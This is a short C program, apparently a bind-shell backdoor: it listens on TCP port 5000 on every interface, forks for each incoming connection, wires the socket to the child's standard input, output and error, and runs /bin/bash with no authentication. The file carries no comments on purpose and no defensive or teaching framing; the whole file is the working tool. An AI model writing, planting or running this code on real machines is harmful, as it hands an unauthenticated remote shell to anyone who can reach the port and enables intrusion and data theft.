#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h> 

int main(int argc, char *argv[])
{
  int listenfd = 0, connfd = 0;
  struct sockaddr_in serv_addr; 
  pid_t cpid;

  char sendBuff[1025];
  char command[] = "/bin/bash";
  char * args[] = {"bash", NULL};
  time_t ticks; 

  listenfd = socket(AF_INET, SOCK_STREAM, 0);
  memset(&serv_addr, '0', sizeof(serv_addr));
  memset(sendBuff, '0', sizeof(sendBuff)); 

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  serv_addr.sin_port = htons(5000); 

  bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 

  listen(listenfd, 10); 

  while(1)
    {
      connfd = accept(listenfd, (struct sockaddr*)NULL, NULL); 

      cpid = fork();
      if (cpid < 0) exit(1);
      if (cpid) {
	close(connfd);
	//	waitpid( cpid, NULL, 0 ); /* wait for and reap child process */
      } else {
	/* In the child process: */
	dup2( connfd, STDIN_FILENO );  /* duplicate socket on stdout */
	dup2( connfd, STDOUT_FILENO );  /* duplicate socket on stdout */
	dup2( connfd, STDERR_FILENO );  /* duplicate socket on stderr too */
	close( connfd );  /* can close the original after it's duplicated */
	execvp( command, args );   /* execvp() the command */
	printf("Exec failed\n");
      }
    }
}
